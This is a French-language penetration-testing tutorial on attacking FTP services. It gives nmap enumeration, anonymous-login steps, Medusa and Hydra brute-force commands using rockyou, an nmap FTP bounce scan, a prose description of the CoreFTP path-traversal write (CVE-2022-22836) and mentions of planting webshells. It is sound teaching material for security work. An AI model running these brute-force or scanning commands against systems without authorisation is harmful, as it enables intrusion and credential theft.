# Attaquer FTP

Le File Transfer Protocol (FTP) reste présent dans de nombreux environnements, souvent pour des transferts automatisés ou des dépôts de fichiers internes. Son ancienneté implique des comportements par défaut permissifs et une surface d'attaque bien documentée : accès anonyme, brute force, rebond de scan, et vulnérabilités spécifiques à certaines implémentations.

## Pourquoi

FTP transmet les identifiants en clair (sauf FTPS/SFTP), ce qui le rend vulnérable au sniffing réseau. Beaucoup de serveurs FTP autorisent encore l'accès anonyme par défaut, et les implémentations anciennes présentent des vulnérabilités connues. En test d'intrusion, un FTP mal configuré peut fournir des fichiers de configuration, des sauvegardes, ou un point de dépôt pour du contenu malveillant.

## Comment ça marche

### Énumération

Un scan Nmap avec les scripts par défaut (`-sC`) révèle généralement la version du serveur FTP et indique si l'accès anonyme est autorisé :

```bash
# - Scan du service FTP
nmap -sCV -p21 <IP_CIBLE>
```

Les informations utiles dans la sortie :
- Version du serveur (vsftpd, ProFTPD, Pure-FTPd, IIS FTP, etc.)
- Statut de l'accès anonyme (`Anonymous FTP login allowed`)
- Système d'exploitation sous-jacent (souvent déduit de la bannière)

### Accès anonyme

Quand l'accès anonyme est activé, on se connecte avec le login `anonymous` et un mot de passe vide (ou une adresse email quelconque) :

```bash
# - Connexion anonyme au FTP
ftp <IP_CIBLE>
# login: anonymous
# password: (vide ou email)
```

Une fois connecté, explorer les répertoires et récupérer tout fichier intéressant : configurations, scripts, sauvegardes, clés. Les commandes FTP de base : `ls`, `cd`, `get`, `mget`, `put`.

{% hint style="warning" %}
L'accès anonyme en écriture est particulièrement dangereux. Si le répertoire FTP est accessible par un serveur web, on peut déposer un webshell et obtenir une exécution de code.
{% endhint %}

### Brute force

Sans accès anonyme, le brute force reste une option si aucune politique de verrouillage n'est en place. Medusa est un outil efficace pour cette tâche :

```bash
# - Brute force FTP avec Medusa
medusa -u utilisateur -P /usr/share/wordlists/rockyou.txt \
    -h <IP_CIBLE> -M ftp
```

On peut aussi utiliser Hydra :

```bash
# - Brute force FTP avec Hydra
hydra -l utilisateur -P /usr/share/wordlists/rockyou.txt \
    ftp://<IP_CIBLE>
```

{% hint style="info" %}
Adapter la wordlist au contexte. Sur un serveur d'entreprise, les mots de passe suivent souvent un pattern prévisible (nom de l'entreprise + année, saison + année, etc.). Un spray avec quelques candidats ciblés est souvent plus efficace qu'un brute force massif.
{% endhint %}

### FTP Bounce Attack

Le FTP Bounce Attack exploite la commande `PORT` du protocole FTP pour demander au serveur FTP d'envoyer des données vers un tiers. En pratique, cela permet d'utiliser le serveur FTP comme proxy pour scanner des ports sur des machines internes inaccessibles directement.

Nmap intègre cette technique via l'option `-b` :

```bash
# - FTP bounce scan via Nmap
nmap -Pn -v -n -p80 -b anonymous@<IP_FTP> <IP_INTERNE>
```

Cette technique est ancienne et la plupart des serveurs FTP modernes la bloquent. Elle reste néanmoins pertinente sur des équipements legacy ou des implémentations embarquées.

### Vulnérabilités connues : CoreFTP (CVE-2022-22836)

CoreFTP Server avant la version 727 est vulnérable à un directory traversal combiné à une écriture arbitraire. Le vecteur d'attaque passe par le protocole HTTP intégré (pas le FTP lui-même) : une requête `PUT` avec un chemin contenant `%2f..%2f` permet d'écrire des fichiers en dehors du répertoire racine.

Le flux de l'attaque :
1. L'attaquant envoie une requête HTTP `PUT` avec un chemin traversal
2. Le serveur HTTP de CoreFTP traite la requête avec les droits du service
3. Le fichier est écrit à l'emplacement choisi par l'attaquant

{% hint style="danger" %}
Si le service CoreFTP tourne avec des privilèges élevés, cette écriture arbitraire peut mener à une exécution de code (dépôt d'un webshell, remplacement d'un binaire planifié, etc.).
{% endhint %}

## En pratique

```bash
# 1 - Scan complet du service FTP
nmap -sCV -p21 <IP_CIBLE>

# 2 - Tester l'accès anonyme
ftp <IP_CIBLE>
# > anonymous / (vide)
# > ls -la
# > cd <repertoire>
# > mget *

# 3 - Si pas d'accès anonyme, brute force
medusa -u admin -P /usr/share/wordlists/rockyou.txt \
    -h <IP_CIBLE> -M ftp

# 4 - FTP bounce scan (si supporté)
nmap -Pn -v -n -p22,80,443,445,3389 \
    -b anonymous@<IP_FTP> <IP_INTERNE>

# 5 - Vérifier les CVE connues pour la version détectée
searchsploit "ProFTPD 1.3"
searchsploit "vsftpd 2.3"
```

## Pièges et galères

{% tabs %}
{% tab title="Connexion" %}
- **Mode passif vs actif** : si la connexion FTP s'établit mais que `ls` ne retourne rien, passer en mode passif avec la commande `passive` dans le client FTP, ou utiliser `lftp` qui gère mieux les modes
- **TLS requis** : certains serveurs FTP n'acceptent que FTPS. Utiliser `lftp` avec `set ftp:ssl-force true` ou `openssl s_client -connect <IP>:21 -starttls ftp`
- **Timeout** : les connexions FTP expirent rapidement en cas d'inactivité. Récupérer les fichiers intéressants dès la connexion établie
{% endtab %}
{% tab title="Brute force" %}
- **Verrouillage de compte** : certains serveurs FTP (notamment IIS FTP) verrouillent les comptes après N tentatives. Vérifier la politique avant de lancer un brute force massif
- **Bannières trompeuses** : la version affichée dans la bannière FTP peut être modifiée par l'administrateur. Ne pas se fier uniquement à cette information pour chercher des CVE
{% endtab %}
{% tab title="Bounce" %}
- **Serveurs modernes** : la quasi-totalité des serveurs FTP actuels refuse les connexions bounce. Ne pas perdre de temps à tester systématiquement, sauf sur du matériel legacy
- **Faux positifs Nmap** : le bounce scan peut produire des résultats peu fiables selon la configuration du serveur FTP
{% endtab %}
{% endtabs %}

## Retour terrain

Le FTP est de moins en moins courant dans les environnements modernes, remplacé par SFTP, SCP ou des solutions de partage cloud. On le trouve encore dans des contextes spécifiques : transferts automatisés avec des partenaires, firmware de matériel réseau, serveurs de dépôt legacy. Quand il est présent, l'accès anonyme reste le vecteur le plus fréquent, suivi des identifiants par défaut.

La recherche de CVE connues est souvent productive sur FTP, car les serveurs sont rarement mis à jour (surtout sur des équipements embarqués ou des systèmes legacy). Toujours vérifier la version détectée dans `searchsploit` et sur les bases de CVE publiques.

## Mémo express

| Technique | Outil / Commande | Prérequis |
|---|---|---|
| Accès anonyme | `ftp <IP> / anonymous` | Accès anonyme activé |
| Brute force | `medusa -M ftp`, `hydra ftp://` | Pas de verrouillage de compte |
| Bounce scan | `nmap -b anonymous@<IP_FTP>` | Serveur FTP supportant PORT |
| CVE CoreFTP | `PUT` HTTP avec traversal | CoreFTP < 727 avec HTTP activé |
| Sniffing | `tcpdump`, Wireshark | Positionnement réseau (MITM) |

***
